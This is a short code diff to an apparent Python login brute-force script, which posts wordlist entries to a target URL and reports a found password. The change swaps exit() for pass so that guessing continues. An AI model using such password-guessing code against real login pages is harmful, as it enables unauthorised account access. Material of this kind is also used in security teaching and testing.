@@ -18,14 +18,14 @@ try:
             response = requests.post(target_url, data=data_dict)        
             if "Login failed" not in response.content:
                 print("[+] Password found: " + word)
-                exit()
+                #exit()
+                pass #do pass instead of exit to avoid triggering except:
 except:
     print("Word list file not found, check path and filename")
 
-    
-    
-    
-    
+
+
+
 #!/usr/bin/env python
 
 import requests
